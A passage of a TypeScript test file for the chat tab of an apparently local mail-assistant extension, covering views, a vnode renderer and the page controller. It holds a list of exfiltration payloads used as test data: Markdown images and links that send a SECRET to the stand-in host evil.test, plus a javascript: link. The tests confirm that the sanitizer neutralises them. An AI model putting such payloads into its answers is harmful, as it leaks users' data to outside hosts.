// Plan 08b step 5: the chat tab's views (ui/chat/view.ts) as h() vnodes (plain objects, no DOM),
// the vnode renderer (ui/chat/vdom.ts, the P2 fallback for preact) over a small fake DOM, and the
// page controller (ui/chat/main.ts ChatPage) with a fake port. Synthetic ids and text only.

import { describe, expect, it } from "vitest";
import type { RuntimePort } from "../src/background/platform";
import type { IndexStatus, PageMessage, PageRequest } from "../src/protocol";
import type { PageStore } from "../src/tb/api";
import { type ChatElements, ChatPage } from "../src/ui/chat/main";
import {
  type Action,
  type ChatState,
  FORGOTTEN_NOTE,
  initialState,
  PORT_CLOSED_NOTICE,
  update,
} from "../src/ui/chat/state";
import { type Child, childrenOf, h, render, type VNode } from "../src/ui/chat/vdom";
import {
  actionsView,
  blockNode,
  headerView,
  IMAGE_REMOVED_LABEL,
  inlineNode,
  logView,
  overlayView,
  statusText,
} from "../src/ui/chat/view";

const A = "a".repeat(64);
const B = "b".repeat(64);

// --- vnode helpers --------------------------------------------------------------------------

function kids(v: VNode): (VNode | string)[] {
  return childrenOf(v.props.children);
}

/** Every vnode of a tree (depth first), strings excluded. */
function all(c: Child): VNode[] {
  const out: VNode[] = [];
  const walk = (x: VNode | string): void => {
    if (typeof x === "string") return;
    out.push(x);
    for (const k of kids(x)) walk(k);
  };
  for (const x of childrenOf([c])) walk(x);
  return out;
}

/** The text of a tree, strings joined. */
function text(c: Child): string {
  return childrenOf([c])
    .map((x) => (typeof x === "string" ? x : text(x.props.children as Child)))
    .join("");
}

function click(v: VNode): void {
  const fn = v.props.onClick;
  if (typeof fn !== "function") throw new Error("no onClick");
  fn({} as Event);
}

function recorder(): { actions: Action[]; dispatch: (a: Action) => void } {
  const actions: Action[] = [];
  return { actions, dispatch: (a) => void actions.push(a) };
}

/** A tab that already knows ternd's model setting (a local model; sends are gated on it). */
function stateWith(...actions: Action[]): ChatState {
  let s: ChatState = {
    ...initialState("session-1"),
    info: { kind: "known", remoteLlm: false, chatModel: "synthetic-chat" },
  };
  for (const a of actions) s = update(s, a).state;
  return s;
}

const msg = (m: PageMessage): Action => ({ type: "message", msg: m });

/** One turn `t-1` with `answer` streamed, then ended by `end` (if given). */
function answered(answer: string, end?: PageMessage): ChatState {
  const actions: Action[] = [
    { type: "submit", text: "the question" },
    msg({ type: "turn", req: 1, turn_id: "t-1" }),
    msg({ type: "delta", turn_id: "t-1", text: answer }),
  ];
  if (end) actions.push(msg(end));
  return stateWith(...actions);
}

// --- fake DOM -------------------------------------------------------------------------------

type Listener = (ev: unknown) => void;

class FNode {
  parentNode: FElement | null = null;
  constructor(
    readonly nodeType: number,
    readonly ownerDocument: FDocument,
  ) {}
}

class FText extends FNode {
  constructor(
    doc: FDocument,
    public data: string,
  ) {
    super(3, doc);
  }
}

class FElement extends FNode {
  readonly attributes = new Map<string, string>();
  readonly childNodes: FNode[] = [];
  readonly listeners = new Map<string, Listener[]>();
  scrollTop = 0;
  scrollHeight = 0;
  clientHeight = 0;
  constructor(
    doc: FDocument,
    readonly localName: string,
  ) {
    super(1, doc);
  }
  appendChild(n: FNode): FNode {
    n.parentNode = this;
    this.childNodes.push(n);
    return n;
  }
  replaceChild(n: FNode, old: FNode): FNode {
    const i = this.childNodes.indexOf(old);
    if (i < 0) throw new Error("not a child");
    this.childNodes[i] = n;
    n.parentNode = this;
    old.parentNode = null;
    return old;
  }
  removeChild(old: FNode): FNode {
    const i = this.childNodes.indexOf(old);
    if (i < 0) throw new Error("not a child");
    this.childNodes.splice(i, 1);
    old.parentNode = null;
    return old;
  }
  setAttribute(k: string, v: string): void {
    this.attributes.set(k, v);
  }
  removeAttribute(k: string): void {
    this.attributes.delete(k);
  }
  addEventListener(type: string, cb: Listener): void {
    this.listeners.set(type, [...(this.listeners.get(type) ?? []), cb]);
  }
  fire(type: string, ev: unknown = {}): void {
    for (const cb of this.listeners.get(type) ?? []) cb(ev);
  }
  get textContent(): string {
    return this.childNodes
      .map((n) => (n instanceof FText ? n.data : (n as FElement).textContent))
      .join("");
  }
  /** Elements below this one (depth first) with `localName` and, if given, a class. */
  find(localName: string, cls?: string): FElement[] {
    const out: FElement[] = [];
    for (const n of this.childNodes) {
      if (!(n instanceof FElement)) continue;
      const classes = (n.attributes.get("class") ?? "").split(" ");
      if (n.localName === localName && (cls === undefined || classes.includes(cls))) out.push(n);
      out.push(...n.find(localName, cls));
    }
    return out;
  }
}

class FDocument {
  createElement(tag: string): FElement {
    return new FElement(this, tag);
  }
  createTextNode(data: string): FText {
    return new FText(this, data);
  }
}

const asEl = (e: FElement): Element => e as unknown as Element;

// --- views ----------------------------------------------------------------------------------

describe("answer nodes", () => {
  it("a link is an inert button: label shown, URL only in its title, a click asks first", () => {
    const { actions, dispatch } = recorder();
    const v = inlineNode(
      { t: "link", href: "https://example.test/x", label: "the label" },
      false,
      dispatch,
    ) as VNode;
    expect(v.type).toBe("button");
    expect(v.props.type).toBe("button");
    expect(v.props.class).toBe("link");
    expect(v.props.title).toBe("https://example.test/x");
    expect(text(v)).toBe("the label");
    expect(Object.keys(v.props)).not.toContain("href");
    click(v);
    expect(actions).toEqual([{ type: "link", href: "https://example.test/x" }]);
  });

  it("a citation is a chip with the mid shortened; a click dispatches chip", () => {
    const { actions, dispatch } = recorder();
    const v = inlineNode({ t: "cite", mid: A, raw: `[${A}]` }, false, dispatch) as VNode;
    expect(v.type).toBe("button");
    expect(v.props.class).toBe("chip");
    expect(text(v)).toBe("aaaaaaaa…");
    click(v);
    expect(actions).toEqual([{ type: "chip", mid: A }]);
    const pending = inlineNode({ t: "cite", mid: A, raw: "" }, true, dispatch) as VNode;
    expect(pending.props.class).toBe("chip pending");
    // A pending chip (turn still streaming) is inert until chat.done confirms it.
    expect(pending.props.disabled).toBe(true);
    expect(pending.props.onClick).toBeUndefined();
  });

  it("removed images and citations show fixed labels", () => {
    const { dispatch } = recorder();
    expect(text(inlineNode({ t: "image_removed" }, false, dispatch))).toBe(IMAGE_REMOVED_LABEL);
    expect(text(inlineNode({ t: "removed" }, false, dispatch))).toBe("[citation removed]");
  });

  it("blocks map to elements; an ordered list keeps its start; headings are bold lines", () => {
    const { dispatch } = recorder();
    const ol = blockNode(
      { t: "ol", start: 3, items: [{ t: "li", children: [{ t: "text", text: "x" }] }] },
      false,
      dispatch,
    );
    expect(ol.type).toBe("ol");
    expect(ol.props.start).toBe(3);
    const ol1 = blockNode({ t: "ol", items: [] }, false, dispatch);
    expect(Object.keys(ol1.props)).toEqual(["children"]);
    const head = blockNode(
      { t: "h", level: 2, children: [{ t: "text", text: "T" }] },
      false,
      dispatch,
    );
    expect(head.type).toBe("p");
    expect(head.props.class).toBe("heading h2");
    expect((kids(head)[0] as VNode).type).toBe("strong");
    const pre = blockNode({ t: "pre", text: "<b>x</b>" }, false, dispatch);
    expect(text(pre)).toBe("<b>x</b>");
  });

  it("exfiltration payloads render no a, img or href, and no image URL", () => {
    const payloads = [
      "![](https://evil.test/?q=SECRET)",
      "![x](data:image/png;base64,AAAA)",
      "<img src=https://evil.test/a>",
      '<a href="https://evil.test">x</a>',
      "[click](javascript:alert(1))",
      "[citation removed](https://evil.test)",
      "[x][1]\n\n[1]: https://evil.test",
      "<https://evil.test>",
      "**_![a](https://evil.test/n)_**",
    ];
    for (const p of payloads) {
      const { dispatch } = recorder();
      const tree = logView(answered(p, { type: "done", turn_id: "t-1", citations: [] }), dispatch);
      const nodes = all(tree);
      expect(
        nodes.filter((n) => n.type === "a" || n.type === "img"),
        p,
      ).toEqual([]);
      expect(
        nodes.filter((n) => "href" in n.props || "src" in n.props),
        p,
      ).toEqual([]);
      expect(
        nodes.filter((n) => n.props.class === "link"),
        p,
      ).toEqual([]);
      if (p.includes("![")) expect(text(tree), p).not.toContain("evil.test");
    }
  });
});

describe("regions", () => {
  it("the log shows the user text as plain text and the answer through the sanitizer", () => {
    const { dispatch } = recorder();
    const s = stateWith(
      { type: "submit", text: "**not bold** <i>raw</i>" },
      msg({ type: "turn", req: 1, turn_id: "t-1" }),
      msg({ type: "delta", turn_id: "t-1", text: "**bold**" }),
    );
    const tree = logView(s, dispatch);
    const user = all(tree).find((n) => n.props.class === "msg user") as VNode;
    expect(kids(user)).toEqual(["**not bold** <i>raw</i>"]);
    const answer = all(tree).find((n) => n.props.class === "msg assistant") as VNode;
    expect(all(answer).some((n) => n.type === "strong")).toBe(true);
    expect(answer.props["aria-busy"]).toBe(true);
  });

  it("after done, only the daemon's citations are chips", () => {
    const { dispatch } = recorder();
    const s = answered(`One [${A}] two [${B}].`, {
      type: "done",
      turn_id: "t-1",
      citations: [A],
    });
    const tree = logView(s, dispatch);
    const chipNodes = all(tree).filter((n) => String(n.props.class).startsWith("chip"));
    expect(chipNodes.map((n) => text(n))).toEqual(["aaaaaaaa…"]);
    expect(text(tree)).toContain(`[${B}]`);
  });

  it("a stopped turn says stopped; a failed one says why", () => {
    const { dispatch } = recorder();
    const stopped = answered("x", { type: "chat_error", turn_id: "t-1", reason: "cancelled" });
    expect(text(logView(stopped, dispatch))).toContain("stopped");
    const failed = answered("x", { type: "chat_error", turn_id: "t-1", reason: "timeout" });
    const outcome = all(logView(failed, dispatch)).find((n) => n.props.class === "outcome error");
    expect(text(outcome as VNode)).toBe("stopped: the answer took too long");
  });

  it("the confirm panel shows the full URL; Open and Cancel dispatch", () => {
    const href = "https://example.test/path?query=1#frag";
    const { actions, dispatch } = recorder();
    const tree = overlayView(stateWith({ type: "link", href }), dispatch);
    const panel = all(tree).find((n) => n.props.class === "confirm") as VNode;
    expect(text(panel)).toContain(href);
    const buttons = all(panel).filter((n) => n.type === "button");
    expect(buttons.map((b) => text(b))).toEqual(["Open", "Cancel"]);
    for (const b of buttons) click(b);
    expect(actions).toEqual([{ type: "confirm_open" }, { type: "confirm_cancel" }]);
    expect(all(overlayView(stateWith(), dispatch)).some((n) => n.props.class === "confirm")).toBe(
      false,
    );
  });

  it("notices can be dismissed", () => {
    const { actions, dispatch } = recorder();
    const s = stateWith(
      { type: "chip", mid: A },
      msg({ type: "error", req: 1, name: "method_not_available", message: "1.0 session" }),
    );
    const notice = all(overlayView(s, dispatch)).find((n) => n.props.class === "notice info");
    expect(text(notice as VNode)).toContain("tern-bridge 1.1");
    click(all(notice as VNode).find((n) => n.props.class === "dismiss") as VNode);
    expect(actions).toEqual([{ type: "dismiss", id: 1 }]);
  });

  it("Send while idle; Stop while a turn runs, disabled once pressed", () => {
    const { actions, dispatch } = recorder();
    const idle = actionsView(stateWith(), dispatch);
    expect(all(idle).map((n) => [n.type, n.props.type])).toEqual([
      ["div", undefined],
      ["button", "submit"],
    ]);
    const running = answered("x");
    const stop = all(actionsView(running, dispatch)).find((n) => n.type === "button") as VNode;
    expect(text(stop)).toBe("Stop");
    expect(stop.props.disabled).toBe(false);
    click(stop);
    expect(actions).toEqual([{ type: "stop" }]);
    const stopping = update(running, { type: "stop" }).state;
    const again = all(actionsView(stopping, dispatch)).find((n) => n.type === "button") as VNode;
    expect(again.props.disabled).toBe(true);
  });

  it("the header shows the status line; Refresh and New chat dispatch", () => {
    // The chat-list toggle (sidebar) comes first in the bar.
    const { actions, dispatch } = recorder();
    const tree = headerView(stateWith(), dispatch, 0, () => "session-new");
    expect(text(tree)).toContain("status: loading…");
    for (const b of all(tree).filter((n) => n.type === "button")) click(b);
    expect(actions).toEqual([
      { type: "toggle_sidebar" },
      // The chat's permission mode switch (decisions #39).
      { type: "set_mode", mode: "manual" },
      { type: "set_mode", mode: "bypass" },
      { type: "refresh" },
      { type: "new_chat", sessionId: "session-new" },
    ]);
  });

  it("statusText: counts, embedding off, lag, last sync, errors", () => {
    const st: IndexStatus = {
      messages: 120,
      locations: 130,
      conflicted: 2,
      parse_failed: 0,
      headers_only: 0,
      embed_pending: 7,
      lag_s: 1.6,
      last_reconcile: "2026-11-16T10:00:00Z",
      models: { chat: "chat-model", embed: "embed-model", runtime_version: "" },
      accounts: [],
    };
    const now = Date.parse("2026-11-16T10:05:00Z");
    expect(statusText(st, null, now)).toBe(
      "120 messages · 7 to embed · lag 2 s · last sync 5 min ago · 2 conflicted · model chat-model",
    );
    const off = { ...st, conflicted: 0, models: { ...st.models, embed: "" }, last_reconcile: null };
    expect(statusText(off, null, now)).toBe(
      "120 messages · embedding off · lag 2 s · last sync never · model chat-model",
    );
    expect(statusText(st, "unavailable", now)).toBe("status unavailable (unavailable)");
  });
});

// --- renderer -------------------------------------------------------------------------------

describe("vdom", () => {
  it("h refuses element types and props that could load or run something", () => {
    for (const tag of ["a", "img", "script", "iframe", "style", "form", "link", "object"]) {
      expect(() => h(tag, null), tag).toThrow(/not allowed/);
    }
    for (const prop of ["href", "src", "style", "onclick", "innerHTML", "srcdoc", "action"]) {
      expect(() => h("span", { [prop]: "x" }), prop).toThrow(/not allowed/);
    }
    // Inherited keys of the events table are not event props (Object.hasOwn, not `in`).
    for (const prop of ["constructor", "toString", "__proto__", "hasOwnProperty"]) {
      expect(() => h("span", { [prop]: "x" }), prop).toThrow(/not allowed/);
    }
    expect(() => h("button", { onClick: "alert(1)" as never })).not.toThrow(); // checked at render
    const doc = new FDocument();
    const root = doc.createElement("div");
    expect(() => render(h("button", { onClick: "alert(1)" as never }), asEl(root))).toThrow(
      /must be a function/,
    );
    expect(() => render(h("span", { title: (() => 1) as never }), asEl(root))).toThrow(
      /must not be a function/,
    );
  });

  it("renders text as Text nodes, never parsing markup", () => {
    const doc = new FDocument();
    const root = doc.createElement("div");
    render(h("p", { class: "x" }, "<img src=https://evil.test/a>", h("br", null), 5), asEl(root));
    const p = root.childNodes[0] as FElement;
    expect(p.localName).toBe("p");
    expect(p.attributes.get("class")).toBe("x");
    expect(p.childNodes.map((n) => n.constructor.name)).toEqual(["FText", "FElement", "FText"]);
    expect(p.textContent).toBe("<img src=https://evil.test/a>5");
    expect(root.find("img")).toEqual([]);
  });

  it("re-rendering keeps existing nodes, updates text and attributes, removes extras", () => {
    const doc = new FDocument();
    const root = doc.createElement("div");
    render(h("ul", null, h("li", { title: "a" }, "one"), h("li", null, "two")), asEl(root));
    const ul = root.childNodes[0] as FElement;
    const first = ul.childNodes[0] as FElement;
    const firstText = first.childNodes[0] as FText;
    render(h("ul", null, h("li", { class: "c" }, "one!")), asEl(root));
    expect(root.childNodes[0]).toBe(ul);
    expect(ul.childNodes).toHaveLength(1);
    expect(ul.childNodes[0]).toBe(first);
    expect(first.childNodes[0]).toBe(firstText);
    expect(firstText.data).toBe("one!");
    expect([...first.attributes]).toEqual([["class", "c"]]);
    render(h("ol", null), asEl(root));
    expect((root.childNodes[0] as FElement).localName).toBe("ol");
  });

  it("boolean attributes: true sets, false removes; numbers become strings", () => {
    const doc = new FDocument();
    const root = doc.createElement("div");
    render(h("button", { disabled: true, tabindex: 0 }), asEl(root));
    const b = root.childNodes[0] as FElement;
    expect([...b.attributes]).toEqual([
      ["disabled", ""],
      ["tabindex", "0"],
    ]);
    render(h("button", { disabled: false, tabindex: 0 }), asEl(root));
    expect([...b.attributes]).toEqual([["tabindex", "0"]]);
  });

  it("aria-*/data-* booleans are written as true/false, as preact does", () => {
    const doc = new FDocument();
    const root = doc.createElement("div");
    render(h("div", { "aria-busy": true, "data-x": true }), asEl(root));
    const d = root.childNodes[0] as FElement;
    expect([...d.attributes]).toEqual([
      ["aria-busy", "true"],
      ["data-x", "true"],
    ]);
    render(h("div", { "aria-busy": false, "data-x": false }), asEl(root));
    expect([...d.attributes]).toEqual([
      ["aria-busy", "false"],
      ["data-x", "false"],
    ]);
  });

  it("one listener per event; a re-render swaps the handler it calls", () => {
    const doc = new FDocument();
    const root = doc.createElement("div");
    const calls: string[] = [];
    render(h("button", { onClick: () => calls.push("first") }), asEl(root));
    const b = root.childNodes[0] as FElement;
    render(h("button", { onClick: () => calls.push("second") }), asEl(root));
    render(h("button", null), asEl(root));
    b.fire("click");
    render(h("button", { onClick: () => calls.push("third") }), asEl(root));
    b.fire("click");
    expect(b.listeners.get("click")).toHaveLength(1);
    expect(calls).toEqual(["third"]);
  });
});

// --- the page controller --------------------------------------------------------------------

class FakePagePort implements RuntimePort {
  readonly name = "tern-chat";
  posted: PageRequest[] = [];
  error = null;
  failPost = false;
  disconnects = 0;
  private msgCbs: ((m: unknown) => void)[] = [];
  private discCbs: ((p: RuntimePort) => void)[] = [];
  onMessage = { addListener: (cb: (m: unknown) => void) => void this.msgCbs.push(cb) };
  onDisconnect = { addListener: (cb: (p: RuntimePort) => void) => void this.discCbs.push(cb) };
  postMessage(m: unknown): void {
    if (this.failPost) throw new Error("port closed");
    this.posted.push(m as PageRequest);
  }
  disconnect(): void {
    this.disconnects += 1;
  }
  deliver(m: unknown): void {
    for (const cb of this.msgCbs) cb(m);
  }
  drop(): void {
    for (const cb of this.discCbs) cb(this);
  }
}

class FakeInput {
  value = "";
  scrollHeight = 0;
  focused = 0;
  readonly style = { height: "" };
  readonly listeners = new Map<string, Listener[]>();
  addEventListener(type: string, cb: Listener): void {
    this.listeners.set(type, [...(this.listeners.get(type) ?? []), cb]);
  }
  focus(): void {
    this.focused += 1;
  }
  fire(type: string, ev: unknown): void {
    for (const cb of this.listeners.get(type) ?? []) cb(ev);
  }
}

/** The extension's local store, in memory; values are copied as the real one does. */
class FakeStore implements PageStore {
  readonly data = new Map<string, unknown>();
  readonly sets: string[][] = [];
  readonly removes: string[][] = [];
  failGet = false;
  failSet = false;
  getAll(): Promise<Record<string, unknown>> {
    if (this.failGet) return Promise.reject(new TypeError("read failed"));
    return Promise.resolve(JSON.parse(JSON.stringify(Object.fromEntries(this.data))));
  }
  set(items: Record<string, unknown>): Promise<void> {
    if (this.failSet) return Promise.reject(new TypeError("write failed"));
    this.sets.push(Object.keys(items));
    for (const [k, v] of Object.entries(items)) this.data.set(k, JSON.parse(JSON.stringify(v)));
    return Promise.resolve();
  }
  remove(keys: string[]): Promise<void> {
    this.removes.push([...keys]);
    for (const k of keys) this.data.delete(k);
    return Promise.resolve();
  }
}

/** Let pending promise callbacks run. */
const settle = (): Promise<void> => new Promise((r) => setTimeout(r, 0));

/**
 * The chat page over fake ports. Unless `answerInfo` is false, the background answers the
 * startup daemon.info (req 2, after status req 1) with a local model, as a 1.1 ternd would
 * (sends are gated on it since plan 07 step 9b). `later` callbacks wait in `timers` until
 * `runTimers()`; the clipboard and file saving are recorded in `copied` and `files`.
 */
function page(
  opts: {
    connectFails?: () => boolean;
    answerInfo?: boolean;
    store?: FakeStore;
    copyFails?: boolean;
    saveFails?: boolean;
    idPrefix?: string;
  } = {},
) {
  const doc = new FDocument();
  const regions = {
    app: doc.createElement("div"),
    sidebar: doc.createElement("nav"),
    header: doc.createElement("header"),
    log: doc.createElement("main"),
    overlay: doc.createElement("div"),
    actions: doc.createElement("div"),
    artifact: doc.createElement("aside"),
  };
  const form = new FakeInput();
  const input = new FakeInput();
  const ports: FakePagePort[] = [];
  const logs: string[] = [];
  const store = opts.store ?? new FakeStore();
  const timers: { cb: () => void; ms: number }[] = [];
  const copied: string[] = [];
  const files: { filename: string; text: string }[] = [];
  let ids = 0;
  const elements = {
    app: asEl(regions.app),
    sidebar: asEl(regions.sidebar),
    header: asEl(regions.header),
    log: asEl(regions.log),
    overlay: asEl(regions.overlay),
    actions: asEl(regions.actions),
    artifact: asEl(regions.artifact),
    form: form as unknown as ChatElements["form"],
    input: input as unknown as ChatElements["input"],
  };
  const chat = new ChatPage({
    elements,
    connect: () => {
      if (opts.connectFails?.()) throw new TypeError("no runtime");
      const p = new FakePagePort();
      ports.push(p);
      return p;
    },
    store,
    copyText: (text) => {
      if (opts.copyFails) return Promise.reject(new DOMException("denied", "NotAllowedError"));
      copied.push(text);
      return Promise.resolve();
    },
    saveFile: (filename, text) => {
      if (opts.saveFails) throw new TypeError("no downloads");
      files.push({ filename, text });
    },
    randomUUID: () => `${opts.idPrefix ?? "session"}-${++ids}`,
    now: () => 0,
    schedule: (cb) => cb(), // paint at once
    later: (cb, ms) => void timers.push({ cb, ms }),
    log: (m) => void logs.push(m),
  });
  const runTimers = (): void => {
    for (let t = timers.shift(); t !== undefined; t = timers.shift()) t.cb();
  };
  const port = (i = 0): FakePagePort => {
    const p = ports[i];
    if (p === undefined) throw new Error(`no port ${i}`);
    return p;
  };
  const submit = (text: string): void => {
    input.value = text;
    form.fire("submit", { preventDefault: () => {} });
  };
  if (opts.answerInfo !== false) {
    port().deliver({
      type: "info_result",
      req: 2,
      info: { remote_llm: false, chat_model: "synthetic-chat" },
    });
  }
  return {
    chat,
    regions,
    input,
    form,
    ports,
    port,
    logs,
    submit,
    store,
    timers,
    runTimers,
    copied,
    files,
  };
}

describe("ChatPage", () => {
  it("connects when the tab opens and asks for the status and info; the views are rendered", () => {
    const t = page({ answerInfo: false });
    expect(t.ports).toHaveLength(1);
    expect(t.port().posted).toEqual([
      { type: "status", req: 1 },
      { type: "info", req: 2 },
    ]);
    expect(t.regions.header.find("div", "banner")).toEqual([]);
    expect(t.regions.header.textContent).toContain("status: loading…");
    expect(t.regions.log.textContent).toContain("Ask about your mail");
    expect(t.regions.actions.find("button", "send")).toHaveLength(1);
  });

  it("a submitted message is sent with the session id; the answer streams into the log", () => {
    const t = page();
    t.port().deliver({
      type: "error",
      req: 1,
      name: "unavailable",
      message: "ternd not connected",
    });
    expect(t.regions.header.textContent).toContain("status unavailable (unavailable)");
    t.submit("what is new?");
    expect(t.input.value).toBe("");
    expect(t.port().posted.at(-1)).toEqual({
      type: "send",
      req: 3,
      session_id: "session-1",
      text: "what is new?",
      mode: "manual",
    });
    expect(t.regions.actions.find("button", "stop")).toHaveLength(1);
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: "See " });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: `[${A}] and [${B}].` });
    expect(t.regions.log.find("button", "pending")).toHaveLength(2);
    t.port().deliver({ type: "done", turn_id: "t-1", citations: [A] });
    const chips = t.regions.log.find("button", "chip");
    expect(chips.map((c) => c.textContent)).toEqual(["aaaaaaaa…"]);
    expect(t.regions.log.textContent).toContain(`[${B}]`);
    expect(t.port().posted.at(-1)).toEqual({ type: "status", req: 4 });
    expect(t.regions.actions.find("button", "send")).toHaveLength(1);
  });

  it("Enter sends, Shift+Enter does not; the input keeps text that was not sent", () => {
    const t = page();
    const prevented: string[] = [];
    t.input.value = "line one";
    t.input.fire("keydown", {
      key: "Enter",
      shiftKey: true,
      isComposing: false,
      preventDefault: () => prevented.push("shift"),
    });
    expect(t.port().posted).toHaveLength(2); // status and info only
    t.input.fire("keydown", {
      key: "Enter",
      shiftKey: false,
      isComposing: false,
      preventDefault: () => prevented.push("enter"),
    });
    expect(prevented).toEqual(["enter"]);
    expect(t.port().posted.at(-1)?.type).toBe("send");
    t.input.value = "while running";
    t.input.fire("keydown", {
      key: "Enter",
      shiftKey: false,
      isComposing: false,
      preventDefault: () => {},
    });
    expect(t.input.value).toBe("while running");
  });

  it("a chip click posts open {mid}; on a 1.0 session the answer shows the notice", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: `[${A}]` });
    t.port().deliver({ type: "done", turn_id: "t-1", citations: [A] });
    const chip = t.regions.log.find("button", "chip")[0] as FElement;
    chip.fire("click");
    // req 4: done asked no new status (the startup one, req 1, is still unanswered).
    expect(t.port().posted.at(-1)).toEqual({ type: "open", req: 4, mid: A });
    expect(t.regions.overlay.textContent).not.toContain("tern-bridge 1.1");
    t.port().deliver({ type: "error", req: 4, name: "method_not_available", message: "1.0" });
    expect(t.regions.overlay.textContent).toContain("tern-bridge 1.1");
  });

  it("a remote model shows the banner in the header", () => {
    const t = page({ answerInfo: false });
    t.port().deliver({
      type: "info_result",
      req: 2,
      info: { remote_llm: true, chat_model: "big-remote" },
    });
    const [banner] = t.regions.header.find("div", "banner");
    expect(banner?.textContent).toContain("big-remote");
    expect(banner?.attributes.get("role")).toBe("alert");
  });

  it("a link click opens the confirm panel; Open posts openUrl", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: "[docs](https://example.test/d)" });
    const link = t.regions.log.find("button", "link")[0] as FElement;
    expect(link.attributes.has("href")).toBe(false);
    link.fire("click");
    expect(t.regions.overlay.textContent).toContain("https://example.test/d");
    const open = t.regions.overlay.find("button").find((b) => b.textContent === "Open") as FElement;
    open.fire("click");
    expect(t.port().posted.at(-1)).toEqual({
      type: "openUrl",
      req: 4,
      url: "https://example.test/d",
    });
    expect(t.regions.overlay.find("section")).toEqual([]);
  });

  it("Stop posts chat.cancel", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    (t.regions.actions.find("button", "stop")[0] as FElement).fire("click");
    expect(t.port().posted.at(-1)).toEqual({ type: "cancel", req: 4, turn_id: "t-1" });
  });

  it("a malformed message is dropped with a log line", () => {
    const t = page();
    t.port().deliver({ type: "delta", turn_id: 5 });
    expect(t.logs).toEqual(["malformed message from the background dropped"]);
  });

  it("a closed port fails the running turn; the next request reconnects", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().drop();
    expect(t.regions.overlay.textContent).toContain("Lost the connection");
    expect(t.regions.log.textContent).toContain("lost the connection to the background page");
    expect(t.ports).toHaveLength(1); // no reconnect loop: only on the next request
    t.port().deliver({ type: "delta", turn_id: "t-1", text: "ignored" });
    expect(t.regions.log.textContent).not.toContain("ignored");
    t.port().deliver({ type: "session_end" }); // the dead port is no longer listened to
    expect(t.regions.overlay.textContent).not.toContain("may have lost");
    // The setting is asked again first (the background may be a new one), then the send goes.
    t.submit("again");
    expect(t.ports).toHaveLength(2);
    expect(t.port(1).posted).toEqual([{ type: "info", req: 4 }]);
    t.port(1).deliver({
      type: "info_result",
      req: 4,
      info: { remote_llm: false, chat_model: "synthetic-chat" },
    });
    t.submit("again");
    expect(t.port(1).posted.at(-1)).toEqual({
      type: "send",
      req: 5,
      session_id: "session-1",
      text: "again",
      mode: "manual",
    });
  });

  it("a port that throws on post is treated as closed", () => {
    const t = page();
    t.port().failPost = true;
    t.submit("q");
    expect(t.logs).toEqual(["page port post failed: Error"]);
    expect(t.regions.log.textContent).toContain("lost the connection to the background page");
  });

  it("a port that throws on post is disconnected, so the router cancels the tab's turn", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().failPost = true;
    (t.regions.actions.find("button", "stop")[0] as FElement).fire("click");
    expect(t.port().disconnects).toBe(1);
    expect(t.regions.log.textContent).toContain("lost the connection to the background page");
  });

  it("a connect that throws fails the request like a closed port; later ones reconnect", () => {
    let fail = false;
    const t = page({ connectFails: () => fail });
    t.port().drop();
    const closedNotices = (): number =>
      t.chat.state.notices.filter((n) => n.text === PORT_CLOSED_NOTICE).length;
    expect(closedNotices()).toBe(1); // the drop's own notice
    fail = true;
    t.submit("q"); // after the drop this asks info first: that request cannot connect
    expect(t.logs).toEqual(["page port connect failed: TypeError"]);
    expect(t.chat.state.waiting.size).toBe(0);
    // The failed connect is a closed port of its own: a second notice (review item 4), rendered.
    expect(closedNotices()).toBe(2);
    expect(t.regions.overlay.textContent.split("Lost the connection").length - 1).toBe(2);
    expect(t.regions.actions.find("button", "send")).toHaveLength(1);
    fail = false;
    t.submit("again");
    expect(t.ports).toHaveLength(2);
    expect(t.port(1).posted).toEqual([{ type: "info", req: 4 }]);
    t.port(1).deliver({
      type: "info_result",
      req: 4,
      info: { remote_llm: false, chat_model: "synthetic-chat" },
    });
    t.submit("again");
    expect(t.port(1).posted.at(-1)).toEqual({
      type: "send",
      req: 5,
      session_id: "session-1",
      text: "again",
      mode: "manual",
    });
  });

  it("a malformed reply fails its request: a status Refresh works again", () => {
    const t = page();
    t.port().deliver({ type: "status_result", req: 1, status: { messages: "12" } });
    expect(t.logs).toEqual(["malformed message from the background dropped"]);
    expect(t.chat.state.waiting.size).toBe(0);
    expect(t.chat.state.statusError).toBe("internal");
    t.chat.dispatch({ type: "refresh" });
    expect(t.port().posted.at(-1)).toEqual({ type: "status", req: 3 });
  });

  it("session_end from the router fails a send still waiting for its turn", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "session_end" });
    expect(t.regions.log.textContent).toContain("ternd connection reset");
    expect(t.regions.overlay.textContent).toContain("may have lost");
    expect(t.regions.actions.find("button", "send")).toHaveLength(1);
  });
});

// --- chats, saved history, Markdown, artifacts, composer ------------------------------------

/** Every element below `root` (depth first). */
function elements(root: FElement): FElement[] {
  const out: FElement[] = [];
  for (const n of root.childNodes) {
    if (!(n instanceof FElement)) continue;
    out.push(n, ...elements(n));
  }
  return out;
}

function button(root: FElement, cls: string, label?: string): FElement {
  const b = root
    .find("button", cls)
    .find((x) => label === undefined || x.textContent.includes(label));
  if (b === undefined) throw new Error(`no button .${cls} ${label ?? ""}`);
  return b;
}

type Page = ReturnType<typeof page>;

/** Ask `q` and answer it with `answer` (turn `turnId`, send `req`), ended by chat.done. */
function ask(
  t: Page,
  q: string,
  req: number,
  turnId: string,
  answer: string,
  cites: string[] = [],
) {
  t.submit(q);
  t.port().deliver({ type: "turn", req, turn_id: turnId });
  t.port().deliver({ type: "delta", turn_id: turnId, text: answer });
  t.port().deliver({ type: "done", turn_id: turnId, citations: cites });
}

const titles = (t: Page): string[] =>
  t.regions.sidebar.find("span", "chat-title").map((s) => s.textContent);

describe("ChatPage: the chat list", () => {
  it("New chat, switching and deleting by clicks in the sidebar", () => {
    const t = page();
    ask(t, "first question", 3, "t-1", "answer one");
